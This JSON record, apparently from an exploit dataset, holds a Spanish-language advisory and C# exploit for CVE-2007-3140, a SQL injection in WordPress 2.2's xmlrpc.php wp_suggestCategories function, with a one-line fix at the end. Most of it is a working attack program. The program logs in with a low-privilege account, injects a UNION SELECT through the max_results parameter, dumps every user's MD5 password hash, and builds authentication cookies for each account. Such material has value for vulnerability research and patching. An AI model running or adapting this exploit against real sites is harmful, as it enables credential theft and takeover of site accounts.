{
  "id": "4039",
  "title": "WordPress Core 2.2 - &#039;xmlrpc.php&#039; SQL Injection",
  "cve": "CVE-2007-3140",
  "vuln_type": "sqli",
  "code": "/*\r\nEl error, bastante tonto por cierto, se encuentra en la funci\u00c3\u00b3n wp_suggestCategories, en el archivo xmlrpc.php:\r\n \r\nfunction wp_suggestCategories($args) {\r\n        global $wpdb;\r\n\r\n        $this->escape($args);\r\n\r\n        $blog_id                             = (int) $args[0];\r\n        $username                            = $args[1];\r\n        $password                            = $args[2];\r\n        $category                            = $args[3];\r\n        $max_results            \t     = $args[4];\r\n\r\n        if(!$this->login_pass_ok($username, $password)) {\r\n                return($this->error);\r\n        }\r\n\r\n        // Only set a limit if one was provided.\r\n        $limit = \"\";\r\n        if(!empty($max_results)) {\r\n                $limit = \"LIMIT {$max_results}\";\r\n        }\r\n\r\n        $category_suggestions = $wpdb->get_results(\"\r\n                SELECT cat_ID category_id,\r\n                        cat_name category_name\r\n                FROM {$wpdb->categories}\r\n                WHERE cat_name LIKE '{$category}%'\r\n                {$limit}\r\n        \");\r\n\r\n        return($category_suggestions);\r\n}\r\n\r\nComo se puede observar en la porci\u00c3\u00b3n de c\u00c3\u00b3digo, no se hace una conversi\u00c3\u00b3n a entero del valor de $max_results, por lo que es posible enviar valores del tipo 0 UNION ALL SELECT user_login, user_pass FROM wp_users. Para que un atacante logre su objetivo, es necesario que \u00c3\u00a9ste tenga una cuenta de usuario v\u00c3\u00a1lida (una cuenta de tipo suscriber basta y sobra) en el sitio v\u00c3\u00adctima.\r\n\r\nPrepar\u00c3\u00a9 un peque\u00c3\u00b1o exploit (Creditos: Alex) que devuelve la lista de usuarios con sus respectivas contrase\u00c3\u00b1as en MD5, adem\u00c3\u00a1s tambi\u00c3\u00a9n incluye las cookies de autenticaci\u00c3\u00b3n para cada usuario.\r\n\r\nCredits: Alex de la Concha\r\n\r\ncode c sharp:\r\n*/\r\n \r\nusing System;\r\nusing System.Net;\r\nusing System.Text;\r\nusing System.Xml;\r\nusing System.Text.RegularExpressions;\r\nusing System.Security.Cryptography;\r\n\r\nclass Program\r\n{\r\n    static void Main(string[] args)\r\n    {\r\n        string targetUrl = \"http://localhost/wp/\";\r\n        string login = \"alex\";\r\n        string password = \"1234\";\r\n\r\n        string data = @\"<methodCall>\r\n  <methodName>wp.suggestCategories</methodName>\r\n  <params>\r\n    <param><value>1</value></param>\r\n    <param><value>{0}</value></param>\r\n    <param><value>{1}</value></param>\r\n    <param><value>1</value></param>\r\n    <param><value>0 UNION ALL SELECT user_login, user_pass FROM {2}users</value></param>\r\n  </params>\r\n</methodCall>\";\r\n\r\n        string cookieHash = GetCookieHash(targetUrl);\r\n\r\n        using (WebClient request = new WebClient())\r\n        {\r\n            /* Probar con el prefijo por omisi\u00c3\u00b3n */\r\n            string response = request.UploadString(targetUrl + \"xmlrpc.php\",\r\n                string.Format(data, login, password, \"wp_svn_\"));\r\n\r\n            /* Se hace una nueva petici\u00c3\u00b3n si la consulta anterior falla */\r\n            Match match = Regex.Match(response, @\"FROM\\s+(.*?)categories\\s+\");\r\n            if (match.Success)\r\n            {\r\n                response = request.UploadString(targetUrl + \"xmlrpc.php \",\r\n                    string.Format(data, login, password, match.Groups[1].Value));\r\n            }\r\n\r\n            try\r\n            {\r\n                XmlDocument doc = new XmlDocument();\r\n                doc.LoadXml(response);\r\n\r\n                XmlNodeList nodes = doc.SelectNodes(\"//struct/member/value\");\r\n\r\n                if (nodes != null && doc.SelectSingleNode(\"/methodResponse/fault\") == null)\r\n                {\r\n                    string user, pass;\r\n                    /* Mostrar lista de:\r\n                     * Usuario     md5(contrase\u00c3\u00b1a)\r\n                     * Cookie de Autenticaci\u00c3\u00b3n\r\n                     *\r\n                     */\r\n                    for (int i = 0; i < nodes.Count / 2 + 1; i += 2)\r\n                    {\r\n                        user = nodes.Item(i).InnerText;\r\n                        pass = nodes.Item(i + 1).InnerText;\r\n                        Console.WriteLine(\"Usuario: {0}\\tMD5(Contrase\u00c3\u00b1a): {1}\",\r\n                            user,\r\n                            pass);\r\n                        Console.WriteLine(\"Cookie: wordpressuser_{0}={1};wordpresspass_{0}={2}\\n\",\r\n                            cookieHash,\r\n                            user,\r\n                            MD5(pass));\r\n                    }\r\n                }\r\n                else\r\n                {\r\n                    Console.WriteLine(\"Error:\\n{0}\", response);\r\n                }\r\n            }\r\n            catch (Exception ex)\r\n            {\r\n                Console.WriteLine(\"Error:\\n\" + ex.ToString());\r\n            }\r\n        }\r\n    }\r\n\r\n    private static string GetCookieHash(string targetUrl)\r\n    {\r\n        WebRequest request = WebRequest.Create(targetUrl + \"wp-login.php?action=logout\");\r\n        request.Method = \"HEAD\";\r\n        (request as HttpWebRequest).AllowAutoRedirect = false;\r\n\r\n        WebResponse response = request.GetResponse();\r\n        if (response != null)\r\n        {\r\n            Match match = Regex.Match(response.Headers[\"Set-Cookie\"],\r\n                    @\"wordpress[a-z]+_([a-z\\d]{32})\",\r\n                    RegexOptions.IgnoreCase);\r\n\r\n            if (match.Success)\r\n                return match.Groups[1].Value;\r\n        }\r\n        return string.Empty;\r\n    }\r\n    public static string MD5(string password)\r\n    {\r\n        MD5CryptoServiceProvider x = new MD5CryptoServiceProvider();\r\n        byte[] bs = Encoding.UTF8.GetBytes(password);\r\n        bs = x.ComputeHash(bs);\r\n        StringBuilder s = new StringBuilder();\r\n        foreach (byte b in bs)\r\n        {\r\n            s.Append(b.ToString(\"x2\").ToLower());\r\n        }\r\n        return s.ToString();\r\n    }\r\n}\r\n/*\r\nPara corregir este problema, mientras liberan actualizaciones para Wordpress 2.2, es editar el archivo xmlrpc.php y cambiar la l\u00c3\u00adnea $max_results = $args[4]; de la funci\u00c3\u00b3n wp_suggestCategories por $max_results = (int) $args[4]; o en su defecto bloquear el acceso a xmlrpc.php.\r\n\r\no malo esque tienes que tener una cuenta aunque sea con los minimos permisos para obtener los demas nombres de users con sus respectivos MD5.\r\n\r\n    static void Main(string[] args)\r\n    {\r\n        string targetUrl = \"http://localhost/wp/\";\r\n        string login = \"alex\";\r\n        string password = \"1234\";\r\n\r\nhay seria la ruta donde esta colocado el wordpress 2.2, tu nombre de usuario y tu password.\r\nYa se creo un zip con los archivos vulnerables ya reparados [ xmlrpc.php, wp-admin/post-new.php, wp-admin/page-new.php , wp-admin/users-edit.php. ]\r\n\r\n:: [Slappter] ::\r\n*/\r\n\r\n# milw0rm.com [2007-06-06]",
  "url": "https://www.exploit-db.com/exploits/4039"
}